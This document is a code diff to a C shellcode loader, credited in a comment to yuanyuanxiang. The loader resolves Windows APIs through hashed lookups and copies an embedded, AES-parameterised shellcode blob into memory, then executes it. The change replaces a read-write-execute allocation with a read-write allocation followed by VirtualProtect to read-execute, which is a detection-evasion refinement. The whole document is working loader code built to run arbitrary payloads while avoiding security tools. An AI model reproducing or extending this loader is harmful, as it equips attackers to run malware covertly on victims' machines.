@@ -19,6 +19,9 @@ typedef HMODULE(WINAPI* _LoadLibraryA)(LPCSTR lpLibFileName);
 #define VirtualAlloc_Hash 0x5E893462
 typedef LPVOID(WINAPI* _VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 
+#define VirtualProtect_Hash 1819198468
+typedef BOOL(WINAPI* _VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+
 #define Sleep_Hash 1065713747
 typedef VOID(WINAPI* _Sleep)(DWORD dwMilliseconds);
 
@@ -209,11 +212,21 @@ inline void* mc(void* dest, const void* src, size_t n) {
 // A simple shell code loader.
 // Copy left (c) yuanyuanxiang.
 #ifdef _DEBUG
-int main()
+// Tip: Use menu to generate TinyRun.c.
+#ifdef _WIN64
+#include "../x64/Release/TinyRun.c"
 #else
-int entry()
+#include "../Release/TinyRun.c"
 #endif
-{
+int main(){
+	sc.len = Shellcode_len;
+	if (sc.len > sizeof(sc.data)) return -1;
+	memcpy(sc.data, Shellcode, sc.len);
+	memcpy(sc.aes_iv, "It is a example", 16);
+	memcpy(sc.aes_key, "It is a example", 16);
+#else
+int entry(){
+#endif
 	if (!sc.data[0] || !sc.len)
         return -1;
 
@@ -226,10 +239,13 @@ int entry()
 	_GetProcAddress GetProcAddress = (_GetProcAddress)get_proc_address_from_hash(kernel32, GetProcAddress_Hash, 0);
 	_LoadLibraryA LoadLibraryA = (_LoadLibraryA)get_proc_address_from_hash(kernel32, LoadLibraryA_Hash, GetProcAddress);
 	_VirtualAlloc VirtualAlloc = (_VirtualAlloc)get_proc_address_from_hash(kernel32, VirtualAlloc_Hash, GetProcAddress);
+	_VirtualProtect VirtualProtect = (_VirtualProtect)get_proc_address_from_hash(kernel32, VirtualProtect_Hash, GetProcAddress);
 	_Sleep Sleep = (_Sleep)get_proc_address_from_hash(kernel32, Sleep_Hash, GetProcAddress);
-    void* exec = VirtualAlloc(NULL, sc.len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    void* exec = VirtualAlloc(NULL, sc.len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (exec) {
         mc(exec, sc.data, sc.len);
+		DWORD oldProtect = 0;
+		if (!VirtualProtect(exec, sc.len, PAGE_EXECUTE_READ, &oldProtect)) return -3;
         ((void(*)())exec)();
         Sleep(INFINITE);
     }
